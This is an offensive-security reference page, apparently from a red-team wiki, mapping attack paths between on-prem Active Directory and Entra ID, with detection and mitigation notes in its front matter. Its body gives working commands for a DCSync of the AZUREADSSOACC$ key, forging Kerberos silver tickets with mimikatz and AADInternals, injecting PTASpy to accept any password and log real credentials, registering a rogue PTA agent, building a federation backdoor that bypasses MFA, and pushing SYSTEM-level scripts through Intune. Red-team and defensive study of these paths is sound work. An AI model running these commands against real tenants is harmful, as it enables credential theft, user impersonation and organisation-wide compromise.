---
title: On-Prem <-> Cloud Pivoting
category: AD / Entra ID
order: 90
tags:
  - lateral-movement
  - seamless-sso
  - azureadssoacc
  - silver-ticket
  - pta
  - federation-backdoor
  - intune
  - cloud-to-onprem
  - aadinternals
summary: "Reference map of the paths that cross the hybrid boundary: Seamless SSO (AZUREADSSOACC$) silver ticket to the cloud, abusing recovered Entra Connect sync creds, PTA agent injection/backdoors, the federation backdoor, and the reverse direction — cloud admin to on-prem via Intune script/app deployment to managed devices."
prerequisites:
  - "On-prem -> cloud: DCSync or the AZUREADSSOACC$ NTLM/AES key (Seamless SSO); OR local admin on a PTA agent host; OR recovered Entra Connect sync creds"
  - "Federation backdoor / rogue PTA agent: Global Admin (or a role that can edit domain federation / register PTA agents) in Entra ID"
  - "Cloud -> on-prem: Global Admin or Intune Administrator (or equivalent) to author/assign Intune scripts and apps"
  - Impersonated users must generally be hybrid (synced) so their on-prem SID maps to a cloud identity
tools:
  - AADInternals
  - mimikatz
  - impacket (secretsdump)
  - Malcrove/SeamlessPass
  - Microsoft Intune (Management Extension)
detection:
  - "Seamless SSO: 4768/4769 for the AZUREADSSOACC$ SPN from unexpected hosts; Entra sign-in with no matching on-prem authentication; note the account's password never rotates by default"
  - "PTA: a new/unknown PTA agent registered (Entra Connect Health); sign-ins succeeding with invalid passwords; PTASpy artefacts (C:\\PTASpy\\PTASpy.csv, injected DLL)"
  - "Federation backdoor: a domain flipped managed->federated, or a new IssuerUri / token-signing cert added (Entra audit logs, Set-Domain* events)"
  - "Intune: new script / Win32-app / remediation assignments; IME AgentExecutor logs; device script-run events; audit logs for script authoring by unusual admins"
mitigation:
  - Rotate the AZUREADSSOACC$ Kerberos decryption key on a schedule (Microsoft supports rolling it) or disable Seamless SSO if unused
  - Treat the on-prem MSOL_ and cloud Sync_ accounts as Tier-0; monitor the Directory Synchronization Accounts role; restrict who can register PTA agents
  - Alert on domain federation changes and new token-signing certs; enforce MFA in Conditional Access, not only via IdP claims
  - Lock down Intune script/app authoring (least privilege, PIM); do not enroll privileged admin workstations in the same Intune tenant that manages standard endpoints; Conditional Access + PIM on Global Admin / Intune Administrator
refs:
  - label: "AADInternals — Backdoor part 2: Seamless SSO and Kerberos"
    url: https://aadinternals.com/post/kerberos/
  - label: "TrustedSec — Azure AD Kerberos tickets: pivoting to the cloud"
    url: https://trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud
  - label: Malcrove — SeamlessPass (repo)
    url: https://github.com/Malcrove/SeamlessPass
  - label: "AADInternals — Exploiting Azure AD PTA: backdoor & credential harvesting"
    url: https://aadinternals.com/post/pta/
  - label: Secureworks — Azure AD Pass-Through Authentication flaws
    url: https://www.secureworks.com/research/azure-active-directory-pass-through-authentication-flaws
  - label: "AADInternals — Unnoticed sidekick: cloud access as an on-prem admin"
    url: https://aadinternals.com/post/on-prem_admin/
  - label: IBM X-Force — Detecting Intune lateral movement
    url: https://www.ibm.com/think/x-force/detecting-intune-lateral-movement
  - label: Microsoft Learn — Intune Management Extension
    url: https://learn.microsoft.com/en-us/intune/intune-service/apps/intune-management-extension
  - label: TrustedSec — The privileged roles nobody talks about
    url: https://trustedsec.com/blog/the-privileged-roles-nobody-talks-about
---

This page is a **reference map**, not a chained playbook. Each path is one hop across the hybrid boundary; combine with the extraction techniques in **Hybrid Identity** and **Golden SAML**.

## 1. Seamless SSO silver ticket (on-prem -> cloud)

When Seamless SSO is enabled, Entra Connect creates the computer account **`AZUREADSSOACC$`** in each synced forest and shares its Kerberos decryption key with Entra ID. A valid Kerberos service ticket for the SSO SPN is accepted by Entra as a sign-in. Because that account's **password never rotates by default**, its stolen NT/AES key is a durable key to the cloud.

```sh
# 1) Get the AZUREADSSOACC$ key (DCSync)
secretsdump.py '$domain/$user:$password'@$dc_ip -just-dc-user 'AZUREADSSOACC$'
```

```powershell
# 2a) Forge a silver ticket for the SSO service, impersonating a synced user (mimikatz)
kerberos::golden /user:$target_user /sid:<domain-SID> /id:<target-RID> \
  /domain:$domain /rc4:<AZUREADSSOACC$-NThash> \
  /target:autologon.microsoftazuread-sso.com /service:HTTP /ptt
```

```powershell
# 2b) Cleaner path — AADInternals only needs the impersonated user's SID
$kt = New-AADIntKerberosTicket -SidString "<target-on-prem-SID>" -Hash "<AZUREADSSOACC$-NThash>"
Get-AADIntAccessTokenForAADGraph -KerberosTicket $kt -Domain $domain -SaveToCache
```

`Malcrove/SeamlessPass` automates the ticket->M365 access-token exchange. Entra matches on the **on-prem SID**, so the impersonated user must be hybrid-synced. This bypasses MFA where MFA is not enforced by Conditional Access.

## 2. Abuse recovered Entra Connect sync creds (on-prem -> cloud)

From the sync server (see **Hybrid Identity**) you recover two principals:

- **`MSOL_<installID>`** (on-prem) -> full **DCSync** of the domain.
- **`Sync_<host>@<tenant>.onmicrosoft.com`** (cloud) -> the *Directory Synchronization Accounts* role. Historically abusable to write to synced objects and, in some configs, reset passwords of non-admin synced users / manipulate `ImmutableID`. Microsoft has hardened parts of this over time — verify current capability rather than assuming.

## 3. PTA agent injection & backdoor (on-prem -> cloud)

With PTA, every cloud sign-in is relayed to an on-prem PTA agent that validates the password against a DC. Local admin on an **agent host** makes it a MitM:

```powershell
# Inject into the agent: accept ANY password + log real creds to C:\PTASpy\PTASpy.csv
Install-AADIntPTASpy
```

From the cloud side, a **Global Admin** can register a **rogue PTA agent on attacker infrastructure** — it then receives and approves auth for the whole tenant:

```powershell
Register-AADIntPTAAgent -MachineName "agent.$domain" -FileName agent.pfx
# then run the PTA bootstrapper with agent.pfx to start receiving auth requests
```

## 4. Federation backdoor (cloud -> anywhere)

A Global Admin can flip any tenant domain to **federated** with an attacker-controlled issuer, then sign tokens for any user (cloud-only users included):

```powershell
ConvertTo-AADIntBackdoor -DomainName $domain            # turn the domain into a backdoor
Open-AADIntOffice365Portal -ImmutableID <target-immutableid> -Issuer "http://any.sts/<id>" -ByPassMFA $true
```

This is the config-side cousin of **Golden SAML** — no cert theft, just a malicious trust. It is loud in Entra audit logs (domain auth change).

## 5. Cloud -> on-prem via Intune (reverse direction)

A cloud admin with **Global Admin / Intune Administrator** can push **PowerShell scripts, Win32 apps, or remediation scripts** through the **Intune Management Extension**, which runs them as **SYSTEM** on every Entra-joined and **hybrid-joined** device — including privileged workstations. A hybrid-joined foothold then executes in the on-prem domain context, bridging cloud compromise back down to AD.

> **Chain:** Global/Intune Admin → assign a PowerShell script (runs as SYSTEM) →
> Intune Management Extension on managed devices → code exec on hybrid-joined
> endpoints → on-prem domain foothold.

Scripts leave minimal forensic trace by default and reach many endpoints at once, which is why script/app authoring should be least-privileged and admin devices should not share the Intune tenant that manages standard fleet endpoints.
